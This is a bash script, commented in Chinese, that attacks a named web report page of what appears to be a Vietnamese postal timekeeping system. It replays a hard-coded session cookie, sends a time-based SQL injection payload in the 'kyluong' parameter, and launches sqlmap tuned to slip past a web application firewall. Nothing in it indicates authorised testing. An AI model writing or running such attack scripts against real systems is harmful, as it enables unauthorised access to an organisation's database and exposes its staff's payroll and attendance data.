#!/bin/bash

# 使用用户提供的有效Cookie
COOKIE="ASP.NET_SessionId=web2hx1q4c5hahqtegoaglyk"
BASE="http://vps.vnpost.vn/chamcong"
TARGET_URL="http://vps.vnpost.vn/chamcong/report/rpt_BCC.aspx?kyluong=112025&MA_DV=KVMB&TEN_DV=Kho%20v%E1%BA%ADn%20mi%E1%BB%81n%20b%E1%BA%AFc&MA_BP=TC&TEN_BP=BC%20Khai%20th%C3%A1c%20TC&MA_TO=VP&TEN_TO=V%C4%83n%20ph%C3%B2ng"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 使用有效Cookie测试rpt_BCC.aspx"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo ""
echo "[1] 验证Cookie有效性"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

curl -sk "$TARGET_URL" \
    -H "Cookie: $COOKIE" \
    -o rpt_bcc_valid.html 2>&1

size=$(wc -c < rpt_bcc_valid.html)

echo "  响应大小: $size bytes"

if grep -qi "SessionTimeout\|Object moved" rpt_bcc_valid.html; then
    echo "  ❌ Cookie仍然无效，需要重新登录"
else
    echo "  ✅ Cookie有效！"
fi

echo ""
echo "  页面内容:"
head -50 rpt_bcc_valid.html

echo ""
echo "[2] 手动快速SQL注入测试"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "  测试 kyluong 参数..."

# 基线
start=$(date +%s%N)
curl -sk "$TARGET_URL" -H "Cookie: $COOKIE" -o baseline.html 2>&1
end=$(date +%s%N)
baseline=$(( (end - start) / 1000000 ))

# 时间注入
start=$(date +%s%N)
curl -sk "${TARGET_URL//kyluong=112025/kyluong=112025%27%3B+WAITFOR+DELAY+%2700%3A00%3A05%27--}" \
    -H "Cookie: $COOKIE" \
    -o sqli_test.html 2>&1
end=$(date +%s%N)
elapsed=$(( (end - start) / 1000000 ))

echo "    基线: ${baseline}ms"
echo "    测试: ${elapsed}ms"
echo "    差异: $((elapsed - baseline))ms"

if [ $((elapsed - baseline)) -gt 4000 ]; then
    echo "    🔥🔥🔥 SQL注入确认！"
fi

echo ""
echo "[3] sqlmap扫描（低线程绕WAF）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "  准备sqlmap命令..."
echo ""

SQLMAP_CMD="/tmp/sqlmap/sqlmap.py -u \"$TARGET_URL\" \
--cookie=\"$COOKIE\" \
--random-agent \
--batch \
--threads=1 \
--delay=2 \
--timeout=30 \
--level=3 \
--risk=2 \
--tamper=space2comment \
--technique=T \
-v 1"

echo "  命令: $SQLMAP_CMD"
echo ""
echo "  开始扫描..."

python3 $SQLMAP_CMD 2>&1 | tee sqlmap_scan.txt

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 测试完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
